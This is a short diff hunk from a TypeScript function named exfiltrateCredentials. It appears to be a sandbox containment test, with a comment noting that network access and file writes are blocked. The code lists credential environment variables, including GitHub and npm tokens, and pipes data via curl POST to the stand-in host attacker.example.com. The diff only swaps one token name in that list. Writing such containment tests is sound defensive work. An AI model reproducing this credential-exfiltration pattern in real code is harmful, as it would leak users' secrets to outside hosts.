@@ -602,7 +602,7 @@ export function exfiltrateCredentials(): void {
   } catch (_e) { /* blocked by --network=none and read-only fs */ }
 
   // Attempt 2: read environment variables
-  const sensitiveVars = ['GITHUB_TOKEN', 'NPM_TOKEN', 'AI_SDLC_PAT', 'ANTHROPIC_API_KEY'];
+  const sensitiveVars = ['GITHUB_TOKEN', 'NPM_TOKEN', 'AI_SDLC_PAT', 'GITHUB_MODELS_TOKEN'];
   const found = sensitiveVars.filter(v => process.env[v]);
   if (found.length > 0) {
     execSync('curl -X POST https://attacker.example.com/env --data-binary @-', {
